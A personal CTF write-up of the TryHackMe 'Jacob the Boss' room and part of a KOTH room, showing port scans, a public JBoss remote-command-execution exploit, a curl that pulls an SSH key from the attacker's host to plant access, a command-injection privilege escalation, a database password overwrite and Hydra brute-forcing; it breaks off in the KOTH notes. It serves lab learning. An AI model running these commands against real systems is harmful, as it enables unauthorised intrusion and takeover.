## Jacob the Boss
*Find a way in and learn a little more.*  
*First of all, add the jacobtheboss.box address to your hosts file*

This is [Jacob the Boss](https://tryhackme.com/room/jacobtheboss) from THM. 

## Ports
Quite a few here:

>PORT      STATE SERVICE  
22/tcp    open  ssh  
80/tcp    open  http  
111/tcp   open  rpcbind  
1090/tcp  open  ff-fms  
1098/tcp  open  rmiactivation  
1099/tcp  open  rmiregistry  
3306/tcp  open  mysql  
3873/tcp  open  fagordnc  
4444/tcp  open  krb524  
4445/tcp  open  upnotifyp  
4446/tcp  open  n1-fwp  
4457/tcp  open  prRegister  
4712/tcp  open  unknown  
4713/tcp  open  pulseaudio  
8009/tcp  open  ajp13  
8080/tcp  open  http-proxy  
8083/tcp  open  us-srv  
36348/tcp open  unknown  
40701/tcp open  unknown  
44894/tcp open  unknown  

Yikes! I didn't run a detail scan.

## 8080
At http://jacobtheboss.box:8080/ we find **JBoss**, and if we click through to http://jacobtheboss.box:8080/web-console/ we find, amongst other things:

>JBossâ„¢ Application Server  
Version: 5.0.0.GA (build: SVNTag=JBoss_5_0_0_GA date=200812041721)  
Version Name: Morpheus  
Built on: December 4 2008 

So this is old as anything; who wants to bet it's our way in?

## Searchsploit
{% highlight shell %}
root@kali:/opt/tryhackme/jacob# searchsploit jboss
JBoss AS 3/4/5/6 - Remote Command Execution | multiple/webapps/36575.py
{% endhighlight %}

Seems a likely candidate. I mirror it and try per the instructions:

``
root@kali:/opt/tryhackme/jacob# python 36575.py http://jacobtheboss.box:8080
``

But it doesn't seem happy; I hardcode the port in the script and make a minor change to the argument parsing and this sorts it out, and I get a shell (of sorts).

For some reason I couldn't get the shell I had to send me a 'normal' reverse shell, so instead I created an authorized_keys file and copied over my SSH public key. From there I could SSH in as Jacob.

{% highlight shell %}
[Type commands or "exit" to finish]
Shell> mkdir /home/jacob/.ssh       
Shell> curl http://10.9.10.123:8000/id_rsa.pub -o /home/jacob/.ssh/authorized_keys
{% endhighlight %}

And separately:

{% highlight shell %}
root@kali:/opt/tryhackme/jacob# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.32.152 - - [04/Jan/2021 05:21:34] "GET /id_rsa.pub HTTP/1.1" 200 -
{% endhighlight %}

then 

{% highlight shell %}
root@kali:/opt/tryhackme/jacob# ssh jacob@10.10.32.152
[jacob@jacobtheboss ~]$
{% endhighlight %}

## Privesc
Privesc was via an [intentionally vulnerable](https://security.stackexchange.com/questions/196577/privilege-escalation-c-functions-setuid0-with-system-not-working-in-linux) SUID binary:

{% highlight shell %}
[jacob@jacobtheboss shm]$ pingsys '127.0.0.1; /bin/bash'
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.016 ms

[root@jacobtheboss shm]# cd /root
[root@jacobtheboss root]#
{% endhighlight %}

While I was mucking around with this I also logged into the MySQL server on the host and grabbed Jacob's hash from the DotClear database (it was running on Port 80); couldn't break it though. Since I couldn't break it I decided to change it:

{% highlight shell %}
MariaDB [dotclear]> update dc_user set user_pwd = '$2y$12$mjwHvY4jPzz2hu3RAmxn..n7Yp3.ey2TiYjesOxPgcX0V1f2INw1S' where user_id = 'jacob';
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0
{% endhighlight %}

This was just 'password' from https://bcrypt-generator.com/ but it didn't help at all. Lol.

## KOTH
I also had a go at [this](https://tryhackme.com/room/kothhackers). It doesn't award any points and there are apparently 9 flags. I rooted the box and found 7 of them.

My notes look like below. Essentially we got a hint about weak passwords from the FTP server with anon access, I tried Hydra and got in, then Python had the setuid capability set so that was root. I ran around and found most of the flags. The first flag was on the FTP server.

{% highlight shell %}
root@kali:/opt/tryhackme/koth# hydra -l rcampbell -P /usr/share/wordlists/rockyou.txt ssh://10.10.229.240
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
